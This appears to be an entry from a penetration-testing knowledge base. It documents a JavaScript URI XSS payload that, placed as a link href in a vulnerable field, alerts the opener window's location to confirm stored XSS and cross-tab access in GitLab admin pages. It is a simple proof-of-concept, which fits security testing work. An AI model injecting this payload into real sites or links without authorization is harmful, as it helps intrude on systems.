---
id: cmd-js-alert-opener
data: 'javascript:alert(window.opener.document.location)'
tags:
  - xss
  - test-payload
type: command
output: Browser alert showing the URL of the original tab.
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T00:11:15.904Z'
verified: false
validated: true
submitted: true
---
---

# javascript-alert-opener-location

## Command

```javascript
javascript:alert(window.opener.document.location)
```

## Description

This JavaScript URI payload, when used as a link href, alerts the location of the opener window's document upon execution in a new tab, confirming stored XSS and cross-tab access in GitLab admin contexts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| N/A | Simple alert payload; no parameters | No |

## Examples

### Basic Usage

Enter as URL in vulnerable field:

```javascript
javascript:alert(window.opener.document.location)
```

### Advanced Usage

N/A for this basic test.

## Expected Output

Browser alert dialog displaying the URL of the original tab, e.g., "http://example.gitlab.com/admin/application_settings".

## Related

- [[commands/javascript-csrf-theft-ssh-addition]]
- [[procedures/Inject-JavaScript-Payload-into-Grafana-URL]]

---
